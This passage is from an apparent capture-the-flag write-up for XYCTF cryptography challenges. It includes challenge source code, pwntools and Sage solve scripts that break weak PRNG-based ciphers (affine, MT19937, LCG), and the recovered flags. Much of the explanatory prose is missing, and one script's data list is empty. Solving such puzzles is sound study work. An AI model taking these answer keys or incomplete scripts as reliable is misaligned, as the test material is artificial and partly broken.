class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p><strong></strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>0</mn></msub><mo></mo><mi>a</mi><mo></mo><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">c_{0}\equiv a*m_{0}+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo></mo><mi>a</mi><mo></mo><msub><mi>m</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">c_{1}\equiv a*m_{1}+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo></mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>0</mn></msub><mo></mo><msub><mi>c</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo></mo><msub><mi>m</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mrow><mo></mo><mn>1</mn></mrow></msup><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">a\equiv (c_{0}-c_{1})*(m_{0}-m_{1})^{-1}\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo></mo><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">GCD(m_{0}-m_{1},p)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo></mo><msub><mi>c</mi><mn>0</mn></msub><mo></mo><mi>a</mi><mo></mo><msub><mi>m</mi><mn>0</mn></msub><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">b\equiv c_{0}-a*m_{0}\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><msup><mi>e</mi><mn>2</mn></msup><mtext></mtext><mi>a</mi><mi>b</mi><mtext></mtext><mi>s</mi><mi>e</mi><mi>e</mi><mi>d</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">table^{2}abseed</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">34301</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">p = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, mod</span>):</span><br><span class="line">    g, x, y = egcd(a, mod)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">            c0 = enc[i]</span><br><span class="line">            c1 = enc[j]</span><br><span class="line">            <span class="keyword">for</span> m0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                    <span class="keyword">if</span> m0 == m1:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    delta_m = m1 - m0</span><br><span class="line">                    delta_c = (c1 - c0) % p</span><br><span class="line">                    inv = modinv(delta_m, p)</span><br><span class="line">                    <span class="keyword">if</span> inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    a = (delta_c * inv) % p</span><br><span class="line">                    b = (c0 - a * m0) % p</span><br><span class="line">                    <span class="comment"># Check if a and b are within PRNG&#x27;s output range</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= b &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    valid = <span class="literal">True</span></span><br><span class="line">                    decrypted = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">                        numerator = (c - b) % p</span><br><span class="line">                        inv_a = modinv(a, p)</span><br><span class="line">                        <span class="keyword">if</span> inv_a <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        m = (numerator * inv_a) % p</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= m &lt; <span class="built_in">len</span>(table)):</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        decrypted.append(table[m])</span><br><span class="line">                    <span class="keyword">if</span> valid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;give me seed: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line">enc = json.loads(io.recvline().decode())</span><br><span class="line">flag = decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, <span class="string">f&#x27;XYCTF&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># Flag: XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span></span><br></pre></td></tr></table></figure><h2 id="choice"><a class="markdownIt-Anchor" href="#choice"></a> choice</h2><blockquote><p>Before we wrap up, heres one last easy problem.</p></blockquote><p><code>random.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937</strong><strong>2496*8=19968</strong><code>state</code><strong></strong><code>state</code>()</p><p><img src="https://picx.zhimg.com/80/v2-4cd29979ffa498905e34d294cc0fc69a_1440w.png" alt="" /><br /><code>r</code></p><p><strong></strong><code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">r = []</span><br><span class="line">r = [<span class="number">255</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng_clone() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng_clone() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>)  <span class="comment"># n</span></span><br><span class="line">flag = enc ^^ getrandbits(<span class="number">176</span>-<span class="number">1</span>)    <span class="comment"># 172/8=21.5,22*8=176,1</span></span><br><span class="line">flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span>+long_to_bytes(flag)+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># XYCTF&#123;___0h_51mple_r@nd0m___&#125;</span></span><br></pre></td></tr></table></figure><h2 id="prng_xxxx"><a class="markdownIt-Anchor" href="#prng_xxxx"></a> prng_xxxx*</h2><blockquote><p>Why is it called prng_xxxx?Well, to cut costs and improve efficiency, we laid off the LFSR. Of course, this means the PRNG now has to do a lot more workso its getting way more salary! XDNote: You can check out prng_lfsr on <a href="https://tangcuxiaojikuai.xyz/post/cb7cb618.html">https://tangcuxiaojikuai.xyz/post/cb7cb618.html</a> for some inspiration.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:</span><br><span class="line">    <span class="comment"># /(o)/~~</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span></span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">lcg = LCG(seed, a, b)</span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))</span><br><span class="line"><span class="comment"># [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]</span></span><br><span class="line"><span class="comment"># 